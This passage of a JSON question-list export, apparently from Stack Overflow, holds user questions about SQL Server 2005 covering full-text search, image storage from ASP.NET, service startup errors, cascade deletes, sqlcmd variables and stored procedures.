2005(9.00.5000), I find that it is hitting an exact search for the mentioned string.</p>\n\n<p>Unfortunately, in my production server which is SQL Server 2005(9.00.4035), it is just looking for a match of '<strong>10116</strong>' and giving results which have <strong>10116</strong> in them. I believe that word is also indexed as '<strong>10116</strong>' instead of '<strong>IT`dash`10116</strong>'. (Noise word list for this instance is not empty)</p>\n\n<p>Can anyone tell me why is this distinct behavior found in the two versions. Is there a way I can view the indexed words and the search query split up in Sql2005</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1088,"score":0,"question_id":11030952,"title":"Unable to retrieve or store image in database SQL Server 2005","body":"<p>I am trying to retrieve image from back end in ASP.Net. Using SQL SERVER 2005 as back end. I have tried n number of codes including the one available online. Can any one guide me solve this issue.</p>\n\n<p>My code is below</p>\n\n<p>Table Design:-</p>\n\n<pre><code>create table Image\n (\nImageId Int identity (1,1),ImageName Varchar(50), Image image   \n)\n</code></pre>\n\n<p>Code:-</p>\n\n<pre><code>    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack)\n        {\n            BindGridData();\n        }\n    }\n    string strcon = \"Data Source=SUJITHA\\\\SQLEXPRESS;Initial Catalog=master;Integrated Security=True\";\n    protected void Button1_Click(object sender, EventArgs e)\n    {\n        if (FileUpload1.HasFile)\n        {\n            //getting length of uploaded file\n            int length = FileUpload1.PostedFile.ContentLength;\n            //create a byte array to store the binary image data\n            byte[] imgbyte = new byte[length];\n            //store the currently selected file in memeory\n            HttpPostedFile img = FileUpload1.PostedFile;\n            //set the binary data\n            img.InputStream.Read(imgbyte, 0, length);\n            string imagename =TextBox1.Text;\n            //use the web.config to store the connection string\n            SqlConnection connection = new SqlConnection(strcon);\n            connection.Open();\n            SqlCommand cmd = new SqlCommand(\"INSERT INTO Image (ImageName,Image) VALUES (@imagename,@imagedata)\", connection);\n            cmd.Parameters.Add(\"@imagename\", SqlDbType.VarChar, 50).Value = imagename;\n            cmd.Parameters.Add(\"@imagedata\", SqlDbType.Image).Value = imgbyte;\n            int count = cmd.ExecuteNonQuery();\n            connection.Close();\n            if (count == 1)\n            {\n                BindGridData();\n                TextBox1.Text = string.Empty;\n                ScriptManager.RegisterStartupScript(this, this.GetType(), \"alertmessage\", \"javascript:alert('\" + imagename + \" image inserted successfully')\", true);\n            }\n        }\n    }\n\n    private void BindGridData()\n    {\n        SqlConnection connection = new SqlConnection(strcon);\n        SqlCommand command = new SqlCommand(\"SELECT ImageName,Image  from [Image]\", connection);\n        SqlDataAdapter daimages = new SqlDataAdapter(command);\n        DataTable dt = new DataTable();\n        daimages.Fill(dt);\n       GridView1.DataSource = dt;\n       GridView1.DataBind();\n       GridView1.Attributes.Add(\"bordercolor\", \"black\");\n    }\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12856618,"title":"SQL Server service failed to start","body":"<p>while installing sql server 2005 following error came but installed</p>\n\n<blockquote>\n  <p>The SQL Server service failed to start. For more information, see the SQL Server Books Online topics, \"How to: View SQL Server 2005 Setup Log Files\" and \"Starting SQL Server Manually.</p>\n</blockquote>\n\n<p>so i tried to start these following services but it's not getting started because it shown below Error</p>\n\n<pre><code>msftesql$SQLEXPRESS1234\nMSSQL$SQL2005\nMSSQLServerADHelper\nmsftesql$SMARTSQL2005\nmsftesql$SQLEXPRESS\nmsftesql$SQLEXPRESS123\nmsftesql$SQLEXPRESS1234\nMSSQL$SQLEXPRESS1234\nMSSQL$SQLEXPRESS123\nMSSQL$SQLEXPRESS\nSQLBrowser\n</code></pre>\n\n<p>Error is</p>\n\n<blockquote>\n  <p>Windows could not start the sql server the above services on Local Computer.</p>\n  \n  <p>Error2:The system cannot find the file specified.</p>\n</blockquote>\n\n<p>so i am trying to login but it's got failure and showing message like</p>\n\n<blockquote>\n  <p>A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible.</p>\n  \n  <p>Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 26 - Error Locating Server/Instance Specified) (Microsoft SQL Server, Error: -1)</p>\n</blockquote>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12852637,"title":"Issue in installing SQL Server 2005","body":"<p>Before I have SQL Server 2005. It's gotten corrupted so I uninstalled and tried to installing a new one. While installing, the following error appears, but installed in Windows Authentication mode.</p>\n\n<blockquote>\n  <p><em>The SQL Server service failed to start. For more information, see the SQL Server Books Online topics, \"How to: View SQL Server 2005 Setup Log Files\" and \"Starting SQL Server Manually.</em></p>\n</blockquote>\n\n<p>But when I tried to log in, the following error will appear:</p>\n\n<blockquote>\n  <p><em>A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible.</em></p>\n  \n  <p><em>Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 26 - Error Locating Server/Instance Specified) (Microsoft SQL Server, Error: -1)</em></p>\n</blockquote>\n"},{"tags":["c#","sql-server-2005","datetimeoffset"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":11459347,"title":"How do you store DateTimeOffset in a SQL Server DateTime field","body":"<p>This is in C#</p>\n\n<p>I'm consuming data from an RSS feed and want to store the data in our database. The problem that I'm having is how to store the LastUpdateTime.</p>\n\n<pre><code>XmlReader reader = XmlReader.Create(uri);\nSyndicationFeed rssFeed = SyndicationFeed.Load(reader);\n\nvar lastUpdate = rssFeed.LastUpdatedTime;\n</code></pre>\n\n<p>The problem is that rssFeed.LastUpdateTime is a DateTimeOffset. However, we're using SQL Server 2005, which only has DateTime. What is the best practice for handling this scenario? If it matters, all our databases and servers are on Eastern time.</p>\n\n<p>Thanks.</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12846643,"title":"Connecting SQL SERVER in C#.net on networked server","body":"<p>I have an existing application build in C#.net, using SQL SERVER 2005, earlier application and SQL was on same machine, but now I need to connect SQL which is on server and is networked to the machine on which application is installed.\nSo can any one tell me how to connect SQL to application , and what changes need to be made in connection string.</p>\n\n<p>Thanks \nEDIT : I am a bit new to c#.net.\n currently my connection string is : public SqlConnection con = new sqlConnection(\"server=.;database=Database1;integrated security=sspi); so if I just put this will it directly connect to the SQL which is on other computer ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","qtp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12841479,"title":"Running SQL Server Agent job from QTP","body":"<p>Can anyone please help me with the vbscript code to run a particular job in SQL Server 2005. The job is located at SQL Server Agent->Jobs-><em>JOB</em> </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12844142,"title":"Delete rows with continuous dates within date period in SQL Server","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12848024/trying-to-consolidate-employer-records-who-are-continuously-work-for-same-depart\">Trying to consolidate employer records who are continuously work for same department</a>  </p>\n</blockquote>\n\n\n\n<p>I am trying to consolidate employees records who have been continuously (<em>anything &lt; 45 days</em>) enrolled with the specific department  </p>\n\n<p><strong>Note</strong>: If the date diff (<em>between <code>emp_eff_to_date</code> and next row <code>emp_eff_from_date</code></em>) is less than 45 days then it is considered as continuous </p>\n\n<h3>INPUT:</h3>\n\n<pre><code>EMP_ID +      DEPT_ID +        EMP_EFF_FROM_DATE +      EMP_EFF_TO_DATE\n-----------------------------------------------------------------------\n10       10001       8/1/2008              10/31/2009\n10       10001       11/1/2009              2/25/2010\n10       10001       2/26/2010              5/1/2011\n10       10001       8/1/2011              10/30/2011\n10       10001       12/1/2011             10/31/2012\n10       10003       7/1/2007              10/31/2007\n10       10004       9/27/2004              6/8/2006\n10       10004       6/30/2006              6/29/2007\n10       10007       6/25/2006              6/20/2007\n10       10007       8/25/2007              5/25/2008\n</code></pre>\n\n<h3>Output desired:</h3>\n\n<pre><code>EMP_ID         DEPT_ID      EMP_EFF_FROM_DATE     EMP_EFF_TO_DATE\n-------------------------------------------------------------------------\n10          10001        2008-08-01             2011-05-01\n10          10001        2011-08-01             2012-10-31\n10          10003        2007-07-01             2007-10-31\n10          10004        2004-09-27             2007-06-29\n10          10007        2006-06-25             2007-06-20\n10          10007        2007-08-25             2007-06-29\n</code></pre>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","contiguous"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":63,"score":-1,"question_id":12848024,"title":"Trying to consolidate employer records who are continuously work for same department","body":"<p>Trying to consolidate employer who worked same department where TO_DATE and Preceding From date is less than days ..</p>\n\n<p>DATA :</p>\n\n<pre><code>EMP_ID | DEPT_ID |EMP_EFF_FROM_DATE |EMP_EFF_TO_DATE\n10 | 10001 |2008-08-01 | 2009-10-31\n10 |10001 |2009-11-01 | 2010-02-25\n10 | 10001 | 2010-02-26 | 2011-05-01\n10 | 10001 | 2011-08-01 | 2011-10-30\n10 | 10001 | 2011-12-01 | 2012-10-31\n10 | 10003 | 2007-07-01 | 2007-10-31\n10 | 10004 | 2004-09-27 | 2006-06-08\n10 | 10004 | 2006-06-30 | 2007-06-29\n10 | 10007 | 2006-06-25 | 2007-06-20\n10 | 10007 | 2007-08-25 | 2008-05-25 \n</code></pre>\n\n<p>Desired Output:</p>\n\n<pre><code>EMP_ID| DEPT_ID | EMP_EFF_FROM_DATE | EMP_EFF_TO_DATE\n10 | 10001 | 2008-08-01 | 2011-05-01\n10 | 10001 | 2011-08-01 | 2012-10-31\n10 | 10003 | 2007-07-01 | 2007-10-31\n10 | 10004 | 2004-09-27 | 2007-06-29\n10 | 10007 | 2006-06-25 | 2007-06-20\n10 | 10007 | 2007-08-25 | 2007-06-29\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","cross-apply"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12846320,"title":"Using Table valued Function in join","body":"<p>There is a Table valued function which gives multiple rows as output and there are 2 columns as output.</p>\n\n<p>Now I want use this function in the query for all the employees in the employees table</p>\n\n<p>I am using CROSS APPLY but its taking long time and doesn't give any result.</p>\n\n<p>This is the query which I tried</p>\n\n<pre><code>select *\nfrom emp A Cross APPLY fnempDiv(A.EmpID)\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":8,"favorite_count":2,"up_vote_count":7,"down_vote_count":1,"view_count":33371,"score":6,"question_id":721471,"title":"How can I rollback an UPDATE query in SQL server 2005?","body":"<p>How can I rollback an UPDATE query in SQL server 2005?</p>\n\n<p>I need to do this in SQL, not through code.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12842052,"title":"sp_send_dbmail error","body":"<p>How can i pass multiple query in a <code>@query parameter</code> in <code>sp_send_dbmail</code>?</p>\n\n<p>For example:</p>\n\n<pre><code>select count(*) from TableA\nIF count(*)/ @@rowcount = 0  \nExec sp_send_dbmail @profile_name = xx, @recipients = 'xx@abc.com',@subject = 'Test', @body= ' No rows';\nIF count(*)/ @@rowcount &gt; 0\nExec sp_send_dbmail @profile_name = xx, @recipients = 'xx@abc.com',@subject = 'Test', \n@body= ' xx rows';\n</code></pre>\n\n<p>I am not getting any error message, but it stops after the first select statement.</p>\n"},{"tags":["sql","sql-server-2005","sql-update"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12841894,"title":"Duplicate colum values","body":"<p>I have a table with 4 colums.</p>\n\n<pre><code>Id  Description Barcode     Type\n1   A01         L001        Loc\n2   A02         L002        Loc\n3   B01         L003        Loc\n4   Root        L004        Parent\n5   Emplacement L005        Parent\n6   C01         L006        Loc\n7   C02         L007        Loc\n</code></pre>\n\n<p>I want to make an UPDATE of the 'Barcode' column with the value in the 'Description' column where the Type column contains \"Loc\".</p>\n\n<p>I tried something like this:</p>\n\n<pre><code>UPDATE MyTable\nSET Barcode=Description\nWHERE Type='Loc'\n</code></pre>\n\n<p>It seems like I'm getting something wrong.</p>\n"},{"tags":["sql-server-2005","unicode","ssis","types","non-unicode"],"answer_count":6,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":15915,"score":8,"question_id":1299575,"title":"Import Package Error - Cannot Convert between Unicode and Non Unicode String Data Type","body":"<p>I am trying to troubleshoot this error without success.</p>\n\n<p>I have made a dtsx package on my computer using SQL Server 2008.  It imports data from a semicolon delimited csv file into a table where all of the field types are NVARCHAR MAX.</p>\n\n<p>It works on my computer, but it needs to run on the clients server.  Whenever they create the same package with the same csv file and destination table, they receive the error above.</p>\n\n<p>We have gone through the creation of the package step by step, and everything seems OK.  The  mappings are all correct, but when they run the package in the last step, they receive this error.  They are using SQL Server 2005.</p>\n\n<p>Can anyone advise where to begin looking for this problem?</p>\n\n<p>Thanks\nMike Thomas</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":11007,"score":2,"question_id":866139,"title":"Best way to find free space in sql server databases?","body":"<p>I want to be able to find out how much space is left in my database files so that I can know when to increase the space so it doesn't do it when the application is running hard out.</p>\n\n<p>I would prefer to be able to script this so I can run it across multiple databases ion a regular basis.</p>\n\n<p>I have SQL Server 2000 and SQL Server 2005 databases but I would prefer to be able to run the same script across both.   </p>\n\n<p>I can use Management Studio to do this manually on 2005 databases, but not on the 2000 databases.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":13,"favorite_count":7,"up_vote_count":25,"down_vote_count":0,"view_count":159480,"score":25,"question_id":185520,"title":"Convert Month Number to Month Name Function in SQL","body":"<p>I have months stored in SQL Server as 1,2,3,4,...12. I would like to display them as January,February etc. Is there a function in SQL Server like MonthName(1) = January? I am trying to avoid a CASE statement, if possible.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":2703,"score":4,"question_id":1393951,"title":"What is the best way to create and populate a numbers table?","body":"<p>I've seen many different ways to create and populate a numbers table.  However, what is the best way to create and populate one?  With \"best\" being defined from most to least important:</p>\n\n<ul>\n<li>Table created with optimal indexing</li>\n<li>rows generated fastest</li>\n<li>simple code used to create and populate</li>\n</ul>\n\n<p>If you don't know what a numbers table is, look here: <a href=\"http://sqlserver2000.databases.aspfaq.com/why-should-i-consider-using-an-auxiliary-numbers-table.html\" rel=\"nofollow\">Why should I consider using an auxiliary numbers table?</a></p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":104,"score":3,"question_id":12834838,"title":"Calling one stored procedure within another stored procedure using Variables from first stored procedure","body":"<p>I have a stored procedure say <code>@Create_Dummy1</code> which is being passed a Variable. This is declared as <code>@Dummy_Variable1</code> in this stored procedure. Next I need to Call another Stored procedure say <code>@Create_Dummy2</code> from <code>@Create_Dummy1</code>. I need to pass <code>@Dummy_Variable1</code> in <code>exec</code> statement. But if I try to do this the string <code>@Dummy_Variable1</code> is only being passed instead of the value it holds.</p>\n"},{"tags":["sql","sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":86,"score":-2,"question_id":12155480,"title":"Stored procedure SQL Server parameter","body":"<p>I want to write a stored procedure for the following SQL Server table:</p>\n\n<pre><code>No    Date          Days       Percentage\n 1    17-Aug-12      2          -0.34%\n 2    3-Aug-12       15         -29.39%\n 3    27-Jul-12      22          12.02%\n 4    20-Jul-12      29         -0.64%\n 5    13-Jul-12      36         -3.45%\n 6    6-Jul-12       43         -99.93%\n 7    29-Jun-12      50          41.26%\n</code></pre>\n\n<p>Here I want to pass parameter to the percentage column or the days column dynamically. </p>\n\n<p>Please help wite a stored procedure to select only percentages in a range say 12% - 15%</p>\n"},{"tags":["sql-server","sql-server-2005","cascade"],"answer_count":10,"favorite_count":9,"up_vote_count":15,"down_vote_count":0,"view_count":25519,"score":15,"question_id":116968,"title":"In SQL Server 2005, can I do a cascade delete without setting the property on my tables?","body":"<p>I have a database full of customer data.  It's so big that it's really cumbersome to operate on, and I'd rather just slim it down to 10% of the customers, which is plenty for development.  I have an awful lot of tables and I don't want to alter them all with \"ON DELETE CASCADE\", especially because this is a one-time deal.</p>\n\n<p>Can I do a delete operation that cascades through all my tables without setting them up first?  If not, what is my best option?</p>\n"},{"tags":["sql-server","sql-server-2005","sqlcmd"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":4988,"score":6,"question_id":833678,"title":"SQLCMD, command-line variables and script :setvar","body":"<p>When running SQLCMD.exe and providing command-line arguments for scripting variables, I expect that the values provided on the command-line will override those defined in the SQL script file.</p>\n\n<p>e.g.</p>\n\n<p>Given the following SQL Script:</p>\n\n<pre><code>:setvar XXX \"SQL script\"\nprint '$(XXX)'\n</code></pre>\n\n<p>And the command line:</p>\n\n<pre><code>sqlcmd.exe -S &lt;Server&gt; -d &lt;Database&gt; -E -b -i &lt;Script&gt; -v XXX=\"Batch script\"\n</code></pre>\n\n<p>I expect the output to be:</p>\n\n<blockquote>\n  <p>Batch script</p>\n</blockquote>\n\n<p>However the output is:</p>\n\n<blockquote>\n  <p>SQL script</p>\n</blockquote>\n\n<p>Is this the intention, or must the <code>:setvar</code> statements in the SQL script be removed?</p>\n\n<p>I provided the <code>:setvar</code> statements in script, so I can edit/test the script in SQL Management Studio with SQLCMD mode, but run the scripts from the command-line in my test and production environments.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008-r2","sql-server-2012"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12831340,"title":"How to get a list of tables that has updated values","body":"<p>.Hi everyone, I need a little help on coming up with a query that lists all tables whose data was updated from a certain date to present.</p>\n\n<p>I'm using SQL Server 2012.</p>\n\n<p>TIA!</p>\n\n<p>Addt'l info:</p>\n\n<p>This is the query that I have so far:</p>\n\n<pre><code>Select distinct OBJECT_NAME(object_id) As TableName\nFrom sys.dm_db_index_usage_stats\nWhere user_updates &gt; 0\nAnd last_user_update &gt; cast('07/17/2012' as datetime)\norder by TableName\n</code></pre>\n\n<p>I wanted to get all the tables that had its data updated or new data inserted from 07/17/2012 to present.</p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":4206,"score":4,"question_id":923555,"title":"Text search in Stored Procedures in SQL Server 2005","body":"<p>How do I find a stored procedure containing a certain text? While I understand that the best place to do this kind of searching is through your source control tool, but are there ways to do this in the database? </p>\n"},{"tags":["sql-server","sql-server-2005","ssis","dts","ssdt"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":575,"score":1,"question_id":10905044,"title":"SSIS Transfer Database task cryptic error message 0x80131500","body":"<p>I am using SSIS with VS2010 (shell) and databases going from SQL Server 2005 (32 bit)to SQL Server 2012 (64 bit). I am developing directly on the destination server (not optimal, but it works).</p>\n\n<p>When I try to use the Transfer database task, it gives me an error message as follows:\n\"Error: The Execute method on the task returned error code 0x80131500 (An error occurred while transferring data. See the inner exception for details.). The Execute method must succeed, and indicate the result using an \"out\" parameter.\"\n<img src=\"http://i.stack.imgur.com/AG254.png\" alt=\"Error message\"></p>\n\n<p>Here is the problem... how do I view an \"inner exception\"?? it is a GUI interface with no way to step through the code! I even tried <a href=\"http://stackoverflow.com/questions/5772667/how-to-create-an-error-log-or-custom-error-log-within-an-ssis-package/6155087#6155087\">setting up logging</a> - it just logs the same useless error message.</p>\n\n<p>Microsoft has no information for this error code in their reference docs (that I could find).</p>\n\n<p>After googleing the error code, I saw others have this error code along with messages having to do with users, roles, and creating them. </p>\n\n<ul>\n<li>I double checked that I have sysadmin rights on both servers, and<br>\nlogins on both.  </li>\n<li>I tried the same Transfer Database task from each\nserver to itself (with changeing database name) and <em>that</em> worked\nfine for both by themselves. </li>\n<li>I tried both DatabaseOnline and DatabaseOffline options. (same error both ways)</li>\n<li>I tried doing a \"Transfer Logins\" task before doing the transfer database task, that task worked, but not the Transfer databases task. Then it started throwing errors saying that the databases don't exist - which implies that I need to transfer logins AFTER I transfer databases.</li>\n</ul>\n\n<p>Here are my settings:<img src=\"http://i.stack.imgur.com/EVnOG.png\" alt=\"enter image description here\"></p>\n\n<p>What am I doing wrong? <strong>OR</strong> how can I get the \"inner exception\" message?</p>\n\n<p>Also, follow my post to Microsoft's forums here:\n<a href=\"http://social.technet.microsoft.com/Forums/en-US/sqlintegrationservices/thread/cda53c80-8da6-4ed1-898a-9f3ff8464ae2\" rel=\"nofollow\">http://social.technet.microsoft.com/Forums/en-US/sqlintegrationservices/thread/cda53c80-8da6-4ed1-898a-9f3ff8464ae2</a></p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":9844345,"title":"Interrupting a database file shrink process in SSMS 2008","body":"<p>I recently removed table data from a batch of production databases and I've been shrinking the database files using the 'Shrink File' feature in SSMS.  Some of the databases will shrink more than 50gb.  I noticed that this processes takes a very long time to complete and that there is no cancel button while this process is running.  I am connecting to all the database servers remotely via RDP and cannot guarantee that they won't be power-cycled during the trim process.</p>\n\n<p>If the shrink process is running and the server is power-cycled, will I experience database corruption?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":40,"score":-2,"question_id":12827535,"title":"Convertion from Oracle PL/SQL to SQL SERVER 2005 - Moving record from one table to another","body":"<p>Please help me to convert the following Oracle PL/SQL block, in SQL SERVER 2005:</p>\n\n<pre><code>BEGIN \n    DECLARE \n        deleted_rows NUMBER DEFAULT 10000; \n        CURSOR c1 IS \n          SELECT DISTINCT Trunc(build_date) \n          FROM   my_table \n          FOR UPDATE; \n        c1_rec       c1%ROWTYPE; \n    BEGIN \n        FOR c1_rec IN c1 LOOP \n            INSERT INTO my_table_copy \n            SELECT * \n            FROM   my_table \n            WHERE  build_date = c1_rec.my_date; \n\n            COMMIT; \n\n            deleted_rows := 10000; \n\n            WHILE deleted_rows = 10000 LOOP \n                DELETE FROM my_table \n                WHERE  build_date = c1_rec.my_date \n                       AND ROWNUM &lt;= 10000; \n\n                deleted_rows := SQL%rowcount; \n            END LOOP; \n\n            COMMIT; \n        END LOOP; \n    END; \nEND; \n\n/ \n</code></pre>\n"},{"tags":["sql","sql-server-2005","foreign-keys","primary-key"],"answer_count":3,"favorite_count":4,"up_vote_count":6,"down_vote_count":1,"view_count":24357,"score":5,"question_id":1350990,"title":"How to add composite primary key to table","body":"<pre><code>create table d(id numeric(1), code varchar(2))\n</code></pre>\n\n<p>After I create the above table how can I add a composite primary key on both fields and also a foreign key?</p>\n"},{"tags":["sql-server-2005","indexing","scriptgenerate"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3447,"score":0,"question_id":776527,"title":"SQLServer 2005 Generate all INDEX as CREATE statement?","body":"<p>I have two database with same structures, but one of them is missing INDEXES (i think i've missed out), i mean the table didn't have any INDEXES yet.</p>\n\n<p>I was plan to generate CREATE INDEX for the database which have indexes but can't found any method available in Management Studio, yes we can generate script for tables, view, etc, but i was only need to script the INDEXES not anything else.</p>\n\n<p>I know if we generate a script using IF EXIST can be solution, so if object already exist it doesn't recreate, but again for simplicity shake, i just want script the INDEXES.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12812962,"title":"Error in the return value of the stored procedure","body":"<p>I have written a stored procedure and having a varchar(200) varibale as return variable, but in the output its showing as \"conversion failed while converting varchar value to integer\", in teh procedure im not converting to int, but im facing error</p>\n\n<pre><code>alter proc rulename @mfid varchar(20)\nas\ndeclare @ACF2 varchar(200)\nbegin \nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where      MFID=@mfid) &gt; 0)\nbegin\nset @ACF2='Apollo'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + 'GP'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Tactical Comp'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Unit Valuation'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'NPVS'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Apollo Test'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'GP Test'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Tactical Comp Test'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Unit Valuation Test'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'NPVS Test'\nend\nreturn @ACF2\nend\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":126,"score":1,"question_id":12818765,"title":"How to merge multiple rows of single column in sql server 2005?","body":"<p>I get a output as shown in below table from my query as </p>\n\n<p><img src=\"http://i.stack.imgur.com/GRHK5.jpg\" alt=\"enter image description here\"></p>\n\n<p>Now I need my output should something like below table</p>\n\n<p><img src=\"http://i.stack.imgur.com/OlfOV.jpg\" alt=\"enter image description here\"></p>\n\n<p>It will merge the common fields of multiple rows into one cell.</p>\n\n<p>Please help me to achieve this in possible in query level.</p>\n"},{"tags":["c#","sql-server-2005","linq-to-entities"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1325,"score":5,"question_id":2431908,"title":"Linq to Entities : using ToLower() on NText fields","body":"<p>I'm using SQL Server 2005, with a case sensitive database.. </p>\n\n<p>In a search function, I need to create a Linq To Entities (L2E) query with a \"where\" clause that compare several strings with the data in the database with these rules :</p>\n\n<ol>\n<li>The comparison is a \"Contains\" mode, not strict compare : easy as the string's Contains() method is allowed in L2E</li>\n<li>The comparison must be case insensitive : I use ToLower() on both elements to perform an insensitive comparison.</li>\n</ol>\n\n<p>All of this performs really well but I ran into the following Exception : \n\"Argument data type ntext is invalid for argument 1 of lower function\" on one of my fields.  </p>\n\n<p>It seems that the field is a NText field and I can't perform a ToLower() on that.<br>\nWhat could I do to be able to perform a case insensitive Contains() on that NText field ?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":754628,"title":"Why I can't find syslanguages table in my sql server 2005?","body":"<p>It is said this table is contained in 'master', but I couldn't find it.\nDo somebody know the reason?\nHow to fix it?</p>\n"},{"tags":["sql","mysql","sql-server-2005"],"answer_count":17,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":18556,"score":2,"question_id":2160262,"title":"Query for second maximum salary from employee table","body":"<p>How to find out second maximum salary from all employee in employee table? </p>\n\n<p>Please give me the SQL query.</p>\n"}]}
{"total":14387,"page":5,"pagesize":100,"questions":[{"tags":["sql-server-2005","service","windows-vista"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12820540,"title":"Downloading Group Policy Management Console for Windows Vista?","body":"<p>I'm trying to download Group Policy Management Console for Windows Vista Enterprise from <a href=\"http://www.microsoft.com/en-gb/download/details.aspx?id=21895\" rel=\"nofollow\">here</a> </p>\n\n<p>But when I run the program to install this, an error message comes up saying \"This program is blocked due to compatibility issues... Microsoft Group Policy Management Console (GPMC) v.1.1 is incompatible with this version of Windows.\"</p>\n\n<p>Does anyone know where I can find a compatible version, or how I can get this to work?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":432,"score":0,"question_id":4306966,"title":"SQL Server query with multiple values in one column relating to another column","body":"<p><b>Situation:</b> This table holds the relation information between a Documents table and an Users table. Certain Users need to review or approve documents (Type). I would like to have it to where I could get all of the reviewers on one line if needed. So if three users review Document 1, then a row would have 346, 394, 519 as the value, since those are the reviewers</p>\n\n<p><b>Table:</b> 